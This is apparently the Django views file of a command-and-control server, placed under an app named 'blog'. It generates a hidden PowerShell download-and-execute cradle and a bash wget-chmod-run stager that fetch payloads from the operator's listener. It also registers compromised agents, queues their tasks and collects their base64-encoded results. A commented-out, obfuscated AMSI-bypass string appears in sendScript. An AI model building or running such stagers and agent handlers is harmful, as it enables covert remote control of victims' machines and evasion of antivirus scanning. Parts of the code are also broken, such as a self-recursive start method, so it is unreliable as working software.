import base64
from django.conf import settings
from django.contrib.auth.decorators import login_required
from django.shortcuts import render 
from blog.Modules.windows.DirectoryListing import DirectoryListing
from .forms import *
from .models import *
import netifaces
import os
import random
import string
from django.http import HttpResponse , JsonResponse
from django.views import View
from flask import Flask
import threading
import sys
from multiprocessing import Process
from django.contrib.auth.models import User
from django.http import HttpResponseRedirect 
from .forms import UploadFileForm
from rest_framework.response import Response
from rest_framework import status
from rest_framework.views import APIView
from .serializers import *


listen_path = os.path.dirname(os.path.abspath(__file__))+"/data/listeners/"
app         = Flask(__name__)
port = 8000


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip



def registerAgent(request):
    if request.method=='POST':
        hostname = request.POST['hname']
        remoteip = (get_client_ip(request))
        if Agent.objects.filter(hname = hostname).exists():
            data = Agent.objects.get(hname = hostname)
            agentname = data.name
            if data.ip != remoteip:
                data.ip = remoteip
                data.save()
        else:
            agentname     = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) #ASFASA
        
        # request.session['agentname'] = agentname   
        eth = request.POST['eth']
        if Agent.objects.filter(hname = hostname).exists():
            pass
        else:    
            s=Agent(name=agentname, ip = remoteip, hname= hostname )
            s.save() 
        Listener.agent(agentname,remoteip, eth)
        
        request.session['agentName'] = agentname
        response = HttpResponse(agentname)
        response.set_cookie('agentName' , agentname)
        return response
    else:
        return ('',204)

    
class Listener():
    class PostListener(View):
        def post(self,request):
            data = request.POST['listener']
            listnerForm = ListenerForm()
            listnerForm.interface = data
            listnerForm.save()
            return render(request, 'blog/payload-Gen.html' )


        def get(self,request):
            listeners = ListenerForm.objects.order_by("-created_date").all()
            return render(request, 'blog/listeners.html' , {"listeners" : listeners})

    class payloadGen(View):
        def post(self,request):
            #print(request.data)
            #request.data['agent']
            #eth1 = request.data['interface']
            #return JsonResponse({"payload" : "payloads here"} , status=200)
            eth = request.POST['listener']
            
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            output_path= "/tmp/{}".format(eth)
            with open(os.path.dirname(os.path.abspath(__file__))+"/powershell.ps1","rt") as p:
                payload = p.read()
            payload = payload.replace('REPLACE_IP',ip)
            payload = payload.replace('REPLACE_PORT',str(port))
            payload = payload.replace('REPLACE_INTERFACE',eth)
            with open(output_path,"wt") as R:
                R.write(payload)

            with open(listen_path+"/{}".format(eth),"wt") as R:
                R.write(payload)

            oneliner = "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/sc/{}\')\"".format(ip, str(port), eth)
            return JsonResponse({"payload" : oneliner} , status=200)
            #return render(request,'blog/payload-Gen.html', {'payloadline':oneliner})

        def get(self,request):
            return render(request,'blog/payload-Gen.html')


    class lin_payloadGen(View):
        def post(self,request):
            eth = request.POST['listener']
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            output_path= "/tmp/{}".format(eth)
            with open(os.path.dirname(os.path.abspath(__file__))+"/bash","rt") as p:
                payload = p.read()
            payload = payload.replace('REPLACE_IP',ip)
            payload = payload.replace('REPLACE_PORT',str(port))
            payload = payload.replace('REPLACE_INTERFACE',eth)
            with open(output_path,"wt") as R:
                R.write(payload)

            with open(listen_path+"/{}".format(eth),"wt") as R:
                R.write(payload)

            oneliner = "wget http://{}:{}/download/{} -O /tmp/bash;chmod +x /tmp/bash;bash /tmp/bash".format(ip, str(port), eth)
            return JsonResponse({"payload" : oneliner} , status=200)
            #return render(request,'blog/lin_payload-Gen.html', {'payloadline':oneliner})

        def get(self,request):
            return render(request,'blog/lin_payload-Gen.html')

    class agent():   ####### need to take ETH from the GUI user
        def __init__(self, name, remote , eth):

            self.name      = name
            # self.listener  = listener
            self.remote  = remote
            self.eth = eth
            # self.key       = key
            self.sleept    = 3
            self.Path      = listen_path+"agents/{}/".format(self.name)
            self.tasksPath = "{}tasks".format(self.Path, self.name)
            netifaces.ifaddresses(eth)
            self.eth_ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            
            if os.path.exists(self.Path) == False:
                os.mkdir(self.Path)
     
        def run(eth_ip,port):      ######multi threading with django or flask
            app.logger.disabled = True
            app.run(port=port, host=eth_ip)
            
        def start(self):
            server = Process(target=Listener.agent.run(self.eth_ip,port))  
            # get Ethernet from GUI User 
            cli = sys.modules['flask.cli']
            cli.show_server_banner = lambda *x: None
            daemon = threading.Thread(name = self.name,
                                            target = server.start,
                                            args= ())
            daemon.daemon = True
            daemon.start()
            try:
                Listener.agent.start(self)
                print("Listener started.")
            except:
                print("Failed. Check your options.")
                

        def sendScript(request , eth=''):
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            # amsi     = "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE](\"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' )).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),(\"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} ); "
            oneliner = "IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/download/{}\')".format(ip,str(port),eth)
            return HttpResponse(oneliner)


        def sendFile(request, eth=''):
            output_path= "/tmp/{}".format(eth)
            f    = open("{}".format(output_path), "rt")
            data = f.read()
            f.close()
            return HttpResponse(data)


        def serveTasks(request,name=''):
            tasksPath = listen_path+"agents/{}/tasks".format(name)
            if os.path.exists(tasksPath):
                with open(tasksPath, "r") as f:
                    task = f.read()
                    
                os.remove(tasksPath)    
                return HttpResponse(task)
            else:
                return HttpResponse('')


        def receiveResults(request,name=''):
                resultspath = listen_path+"agents/{}/results".format(name)
                if request.method == 'POST':
                    result = request.POST['result']
                    base64_bytes = result.encode('ascii')
                    message_bytes = base64.b64decode(base64_bytes)
                    fresult = message_bytes.decode('ascii')
                    with open(resultspath,'a') as r:
                        r.write(fresult) 
                        r.close()
                    return HttpResponse('')
                else:
                    return HttpResponse('')

        def LinreceiveResults(request,name=''):
            resultspath = listen_path+"agents/{}/results".format(name)
            if request.method == 'POST':
                result = request.body.decode()
                base64_bytes = result.encode('ascii')
                message_bytes = base64.b64decode(base64_bytes)
                result = message_bytes.decode('ascii')
                with open(resultspath,'a') as r:
                    r.write(result) 
                    r.close()
                return HttpResponse('')
            else:
                return HttpResponse('')



#Imaginary function to handle an uploaded file. ########################                                           
def handle_uploaded_file(f):
    with open('uploaded', 'wb+') as destination:
        for chunk in f.chunks():
            destination.write(chunk)


def upload_file(request):
    if request.method == 'POST':
        form = UploadFileForm(request.POST, request.FILES)
        if form.is_valid():
            handle_uploaded_file(request.FILES['file'])
            return HttpResponseRedirect('../homePage')
    else:
        form = UploadFileForm()
    return render(request, 'blog/upload.html', {'form': form})

#########################################################################

def LoginPage(request):
    return render(request  , 'blog/login.html' )

@login_required
def HomePage(request):
    listeners = ListenerForm.objects.all()
    request.session['test'] = "Helo"
    response = render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners)} )
    response.set_cookie( 'test' , 'hello' )
    return response
    #return render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners)} )

@login_required
def Tasks(request):
    return render(request  , 'blog/tasks.html')

class TasksApi(APIView):
    def get(self , request , type):
        if type == 0:
            queryset = Modules.objects.all()   
        elif type == 1:
              queryset = Modules.objects.filter(module_type=1) 
        elif type == 2:
              queryset = Modules.objects.filter(module_type=2)
        else:
             queryset = Modules.objects.filter(module_type=3)
             
        serializer = ModuleSerializer(queryset, many=True, context={'request': request})
        return Response(serializer.data)

@login_required
def ListenersPage(request):
    return render(request  , 'blog/listeners.html' )

def dirlist(request):
    DirectoryListing(request.POST["dir"])         
    return render(request  , 'blog/listeners.html' )

def TestPage(request):
	#oListener =  Listener("test55" , "4252" , "192.168.1.15"); 
	return render(request  , 'blog/start-listener.html' )


@login_required
def HackerUser(request):
    Users  = User.objects.all()
    return render(request  , 'blog/creatuser.html' , {'users' : list(Users) } )


@login_required
def Launcher(request):
    return render(request  , 'blog/launcher.html')